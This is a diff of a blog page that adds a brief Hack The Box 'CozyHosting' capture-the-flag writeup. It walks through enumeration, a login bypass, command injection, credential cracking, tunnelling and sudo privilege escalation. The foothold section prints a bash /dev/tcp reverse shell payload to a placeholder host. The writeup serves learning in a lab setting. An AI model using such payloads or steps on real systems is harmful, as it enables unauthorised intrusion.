@@ -7,20 +7,21 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
 <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Tags | FH27RF</title>
+<title>HTB - CozyHosting Writeup | FH27RF</title>
 <meta name="generator" content="Jekyll v4.2.2">
-<meta property="og:title" content="Tags">
+<meta property="og:title" content="HTB - CozyHosting Writeup">
 <meta property="og:locale" content="en_US">
-<meta name="description" content="A site the is still in its infancy.">
-<meta property="og:description" content="A site the is still in its infancy.">
-<link rel="canonical" href="/tags.html">
-<meta property="og:url" content="/tags.html">
+<meta name="description" content="1. Initial enumeration This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !">
+<meta property="og:description" content="1. Initial enumeration This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !">
+<link rel="canonical" href="/writeup/2023/11/15/CozyHosting-Writeup.html">
+<meta property="og:url" content="/writeup/2023/11/15/CozyHosting-Writeup.html">
 <meta property="og:site_name" content="FH27RF">
-<meta property="og:type" content="website">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-11-15T00:00:00+00:00">
 <meta name="twitter:card" content="summary">
-<meta property="twitter:title" content="Tags">
+<meta property="twitter:title" content="HTB - CozyHosting Writeup">
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebPage","description":"A site the is still in its infancy.","headline":"Tags","url":"/tags.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-11-15T00:00:00+00:00","datePublished":"2023-11-15T00:00:00+00:00","description":"1. Initial enumeration This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !","headline":"HTB - CozyHosting Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2023/11/15/CozyHosting-Writeup.html"},"url":"/writeup/2023/11/15/CozyHosting-Writeup.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="shortcut icon" href="">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -768,7 +769,8 @@ function googleTranslateElementInit() {
         <div class="framework">
   <section class="main">
 
-     
+     <div class="post">
+  <section>
 
 
 
@@ -778,55 +780,255 @@ function googleTranslateElementInit() {
 
 
 
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HTB - CozyHosting Writeup</h1>
+  <h2 class="post-subtitle"></h2>
 
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-11-15T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Nov 15, 2023
+    </time>
 
-
-
-
-
-
-
-  
-  <div class="page-segments">
-  <ul class="page-segments-list">
     
-  </ul>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 3 mins</span>
+  </p></header>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h1 id="1-initial-enumeration">1. Initial enumeration</h1>
+<p>This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !</p>
+
+<p>First and foremost, as usual for any challenge we can run a simple port scan using nmap:
+<img src="CozyHosting/Screenshots/Selection_063.png" alt=""></p>
+
+<p>From this we can already see that the target hosts an HTTP server as well as an SSH server, which probably means that our entry point will probably be found in our browser visiting the site related to this IP; and the SSH server might be useful later once we find a login for it.</p>
+
+<p>Visiting the ip from our browser redirects us to a website (dont forget to add this host in your /etc/hosts file):
+<img src="CozyHosting/Screenshots/Selection_064.png" alt=""></p>
+
+<p>We can quickly see that most links are pointing at the main page, except for the login page:
+<img src="CozyHosting/Screenshots/Selection_065.png" alt=""></p>
+
+<p>However after testing this page for SQL injections (manually or using a tool like sqlmap), this page doesn’t seem vulnerable. We can thus continue our enumeration with some dir busting using gobuster:
+<img src="CozyHosting/Screenshots/Selection_066.png" alt=""></p>
+
+<p>This gives us a list of pages to visit, one of which seems to hold valuable information:
+<img src="CozyHosting/Screenshots/Selection_046.png" alt=""></p>
+
+<p>This can be used to bypass the login and access to the admin panel:
+<img src="CozyHosting/Screenshots/Selection_045.png" alt=""></p>
+
+<h1 id="2-foothold">2. Foothold</h1>
+<p>We gained a first access on the site, we now need a way to execute arbitrary commands on the host.
+On the adnmin page we can a function to patch hosts:
+<img src="CozyHosting/Screenshots/Selection_067.png" alt=""></p>
+
+<p>We can put arbitrary values in both field and then intercept the request with Burp to tinker with it in Repeater. The idea is to find some inputs that would lead to a reverse shell. A payload like this one:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;1
+</code></pre></div></div>
+<p>should be transformed in a way that will be executed by the request on the server. Using brackets, pipe and a proper encoding you should be able to get a reverse shell from this request!
+<img src="CozyHosting/Screenshots/Selection_050.png" alt=""></p>
+
+<p>However, at this point we are yet to access a user account, we can only see a home for a user named ‘josh’.
+A jar file is also present in /app, this file should be downloaded on our machine and extracted to inspect its content and find useful information.</p>
+
+<p><img src="CozyHosting/Screenshots/Selection_051.png" alt=""></p>
+
+<p>The file application.properties contains credentials for a postegres database so we now need a way to access it as it might be our avenue to compromise a user account.</p>
+
+<h1 id="3-gaining-access">3. Gaining access</h1>
+<p>We can’t access the database directly from our machine, however we could by setting up a tunnel from the client to our machine. This can be done using a tool such as Chisel. The tool must be downloaded and deployed on both sides:</p>
+
+<p><img src="CozyHosting/Screenshots/Selection_072.png" alt=""><img src="CozyHosting/Screenshots/Selection_073.png" alt=""></p>
+
+<p>We can then access the database from our machine:
+<img src="CozyHosting/Screenshots/Selection_071.png" alt=""></p>
+
+<p>the user table contains two users with a password hash for each of them. Using John the ripper or Hashcat we can easily crack the admin password which is in the rockyou list.
+<img src="CozyHosting/Screenshots/Selection_059.png" alt=""></p>
+
+<p>We can then use this password as well as the username retrieved earlier to connect to our target using SSH. This gives us access to our user flag !</p>
+
+<h1 id="4-privilege-escalation">4. Privilege escalation</h1>
+<p>Privilege escalation on this machine relies on a very common method, often found in easy challenges. Using ‘sudo -l’ you should have enough information to find which command can be exploited to get root access and open the flag in the /root directory ! (This site can help you find what you are looking for: https://gtfobins.github.io !)</p>
+
+<p>Congratulations !</p>
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/misc/2022/06/26/hello-world.html" title="Hello World!">Hello World!</a><span></span>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/misc/2022/06/26/hello-world.html" title="">Hello World!</a></li>
+<li><a class="post-link" href="/writeup/2023/11/15/CozyHosting-Writeup.html" title="">HTB - CozyHosting Writeup</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
 </div>
 
 
   </section>
   <section class="sidebar" style="margin-left: 15px;">
-    <!-- Get sidebar items -->
+    <!-- Get sidebar items --><style type="text/css" media="screen">
+.post-menu ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+</style>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="common-list">
-  <ul>
-    <li>
-      <a href="/index.html">
-        All<span>2</span>
-      </a>
-    </li>
-
-    
-  </ul>
+<div class="post-menu">
+  <div class="post-menu-title">TOC</div>
+  <div class="post-menu-content"></div>
 </div>
+
+<script>
+  function generateContent() {
+    var menu = document.querySelector(".post-menu");
+    var menuContent =  menu.querySelector(".post-menu-content");
+    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
+
+    // Hide menu when no headings
+    if (headings.length === 0) {
+      return menu.style.display = "none";
+    }
+
+    // Generate post menu
+    var menuHTML = '';
+    for (var i = 0; i < headings.length; i++) {
+      var h = headings[i];
+      menuHTML += (
+        '<li class="h-' + h.tagName.toLowerCase() + '">'
+        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
+    }
+
+    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
+
+    // The header element
+    var header = document.querySelector('header.site-header');
+
+    function doMenuCollapse(index, over_items) {
+      var items = menuContent.firstChild.children;
+
+      if (over_items == undefined) {
+        over_items = 20;
+      }
+
+      if (items.length < over_items) {
+        return;
+      }
+
+      var activeItem = items[index];
+      var beginItem = activeItem
+      var endItem = activeItem
+      var beginIndex = index;
+      var endIndex = index + 1;
+      while (beginIndex >= 0
+        && !items[beginIndex].classList.contains('h-h2')) {
+        beginIndex -= 1;
+      }
+      while (endIndex < items.length
+        && !items[endIndex].classList.contains('h-h2')) {
+        endIndex += 1;
+      }
+      for (var i = 0; i < beginIndex; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+      for (var i = beginIndex + 1; i < endIndex; i++) {
+        item = items[i]
+        // if (!item.classList.contains('h-h2')) {
+          item.style.display = '';
+        // }
+      }
+      for (var i = endIndex; i < items.length; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+    }
+
+    // Init menu collapsed
+    doMenuCollapse(-1);
+
+    // Active the menu item
+    window.addEventListener('scroll', function (event) {
+      var lastActive = menuContent.querySelector('.active');
+      var changed = true;
+      var activeIndex = -1;
+      for (var i = headings.length - 1; i >= 0; i--) {
+        var h = headings[i];
+        var headingRect = h.getBoundingClientRect();
+        var headerRect = header.getBoundingClientRect();
+        var headerTop = Math.floor(headerRect.top);
+        var headerHeight = Math.floor(headerRect.height);
+        var headerHeight = headerTop + headerHeight + 20;
+        if (headingRect.top <= headerHeight) {
+          var id = 'h-' + h.getAttribute('id');
+          var a = menuContent.querySelector('a[href="#' + id  + '"]');
+          var curActive = a.parentNode;
+          if (curActive) {
+            curActive.classList.add('active');
+            activeIndex = i;
+          }
+          if (lastActive == curActive) {
+            changed = false;
+          }
+          break;
+        }
+      }
+      if (changed) {
+        if (lastActive) {
+          lastActive.classList.remove('active');
+        }
+        doMenuCollapse(activeIndex);
+      }
+      event.preventDefault();
+    });
+  }
+  generateContent();
+</script>
 </section>
 </div>
 
